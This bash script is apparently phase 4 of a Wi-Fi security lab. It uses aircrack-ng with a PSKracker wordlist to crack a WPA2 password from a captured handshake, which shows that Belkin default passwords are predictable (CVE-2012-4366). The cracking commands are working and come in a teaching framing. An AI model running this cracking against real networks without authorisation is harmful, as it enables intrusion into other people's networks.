#!/bin/bash
# =============================================================================
# Phase 4: Crack WPA Password
# =============================================================================

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

source "$PROJECT_ROOT/lib/core.sh"

# =============================================================================
# MAIN
# =============================================================================

log_section "PHASE 4: CRACK WPA PASSWORD"

require_root
load_config

# Validate
if [[ -z "$CAPTURE_FILE" ]] || [[ !  -f "$CAPTURE_FILE" ]]; then
    log_error "Capture file not found.  Run Phase 3 first."
    exit 1
fi

if [[ -z "$TARGET_BSSID" ]]; then
    log_error "TARGET_BSSID not set."
    exit 1
fi

log_info "Configuration:"
echo "  • Capture File:   $CAPTURE_FILE"
echo "  • Target BSSID:   $TARGET_BSSID"
echo "  • Expected Pass:  $TARGET_PASSWORD"
echo ""

# Step 1: Find wordlist
log_step "1/3" "Locating wordlist..."
echo ""

WORDLIST_DIR="$PROJECT_ROOT/data/wordlists"
WORDLIST_FILE=$(find "$WORDLIST_DIR" -name "pskracker_*.txt" -type f 2>/dev/null | head -1)

if [[ -z "$WORDLIST_FILE" ]] || [[ ! -f "$WORDLIST_FILE" ]]; then
    log_error "Wordlist not found in $WORDLIST_DIR"
    exit 1
fi

WORD_COUNT=$(wc -l < "$WORDLIST_FILE" | tr -d ' ')
log_success "Wordlist found: $WORDLIST_FILE"
log_info "Word count:  $WORD_COUNT passwords"
echo ""

log_info "Wordlist content:"
head -5 "$WORDLIST_FILE" | while IFS= read -r pwd; do
    echo "  • $pwd"
done
if [[ "$WORD_COUNT" -gt 5 ]]; then
    echo "  ...  and $((WORD_COUNT - 5)) more"
fi
echo ""

# Step 2: Verify capture file
log_step "2/3" "Verifying capture file..."
echo ""

if !  aircrack-ng "$CAPTURE_FILE" 2>&1 | grep -q "1 handshake"; then
    log_error "No valid handshake in capture file"
    exit 1
fi

log_success "Valid handshake confirmed!"
echo ""

# Step 3: Crack password
log_step "3/3" "Cracking password with aircrack-ng..."
echo ""

echo "┌─────────────────────────────────────────────────────────────┐"
echo "│                 CRACKING IN PROGRESS                        │"
echo "├─────────────────────────────────────────────────────────────┤"
printf "│  Target BSSID:  %-43s │\n" "$TARGET_BSSID"
printf "│  Wordlist:      %-43s │\n" "$(basename "$WORDLIST_FILE")"
printf "│  Word Count:    %-43s │\n" "$WORD_COUNT"
echo "└─────────────────────────────────────────────────────────────┘"
echo ""

# Run aircrack-ng with -q (quiet) and pipe to remove ANSI codes
CRACK_OUTPUT=$(aircrack-ng -q -w "$WORDLIST_FILE" -b "$TARGET_BSSID" "$CAPTURE_FILE" 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | sed 's/\x1b\[[0-9;]*H//g' | tr -d '\r')

# Extract key if found
if echo "$CRACK_OUTPUT" | grep -q "KEY FOUND"; then
    # Extract password between [ and ]
    CRACKED_KEY=$(echo "$CRACK_OUTPUT" | grep "KEY FOUND" | head -1 | sed -n 's/.*\[ *\([^ ]*\) *\].*/\1/p')
    
    # Clean up any remaining junk
    CRACKED_KEY=$(echo "$CRACKED_KEY" | tr -d '\n\r' | sed 's/[^a-zA-Z0-9]//g' | head -c 20)
    
    echo ""
    log_section "PHASE 4 COMPLETE"
    echo ""
    echo "┌─────────────────────────────────────────────────────────────┐"
    echo "│            🎉 PASSWORD CRACKED SUCCESSFULLY!  🎉             │"
    echo "├─────────────────────────────────────────────────────────────┤"
    printf "│  Cracked Password:   %-39s │\n" "$CRACKED_KEY"
    printf "│  Expected Password:  %-39s │\n" "$TARGET_PASSWORD"
    echo "├─────────────────────────────────────────────────────────────┤"
    
    if [[ "$CRACKED_KEY" == "$TARGET_PASSWORD" ]]; then
        echo "│  ✅ MATCH! Cracked password matches expected password      │"
    else
        echo "│  ⚠️  Passwords differ (both may be valid for this BSSID)   │"
    fi
    
    echo "└─────────────────────────────────────────────────────────────┘"
    echo ""
    
    save_config "CRACKED_PASSWORD" "$CRACKED_KEY"
    
    log_success "Lab demonstration complete!"
    echo ""
    log_info "This proves:"
    echo "  1. PSKracker generated valid password candidates"
    echo "  2. Belkin default passwords are predictable (CVE-2012-4366)"
    echo "  3. WPA2-PSK can be cracked if password is in wordlist"
    echo ""
    log_info "Next step: sudo ./lab.sh phase5"
    echo ""
    
    set_current_phase "4-complete"
    exit 0
else
    echo "$CRACK_OUTPUT"
    echo ""
    log_error "Password not found in wordlist"
    exit 1
fi
